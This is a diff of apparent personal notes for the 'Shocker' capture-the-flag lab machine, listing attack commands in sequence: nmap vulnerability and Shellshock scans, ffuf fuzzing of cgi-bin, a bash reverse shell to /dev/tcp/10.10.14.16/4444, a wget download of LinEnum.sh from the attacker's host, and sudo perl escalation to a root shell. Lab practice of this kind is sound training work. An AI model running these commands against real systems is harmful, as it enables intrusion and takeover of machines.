@@ -13,8 +13,7 @@ sudo nmap -Pn -sV -sS -A -p- --script vuln -O -oA shocker-full 10.10.10.56
 cat shocker-full
 
 
-ffuf -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -u https://10.10.10.56/FUZZ
-ffuf -w /usr/share/dirb/wordlists/big.txt -u https://10.10.10.56/FUZZ
+ffuf -w /usr/share/dirb/wordlists/big.txt -u http://10.10.10.56/FUZZ
 
 ffuf -w /usr/share/dirb/wordlists/big.txt -e .sh,.py -u http://10.10.10.56/cgi-bin/FUZZ
 
@@ -22,3 +21,19 @@ ffuf -w /usr/share/dirb/wordlists/big.txt -e .sh,.py -u http://10.10.10.56/cgi-b
 
 sudo nmap -Pn -sS -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/user.sh 10.10.10.56 -oA shocker-script
 cat shocker-script
+
+
+
+/bin/bash -i >& /dev/tcp/10.10.14.16/4444 0>&1
+
+
+python3 -c "import pty;pty.spawn('/bin/bash')"
+
+
+sudo python3 -m http.server 8888
+
+wget http://10.10.14.24:8888/LinEnum.sh -O LinEnum.sh
+
+Sudo -l
+
+sudo perl -e 'system ("/bin/bash")'
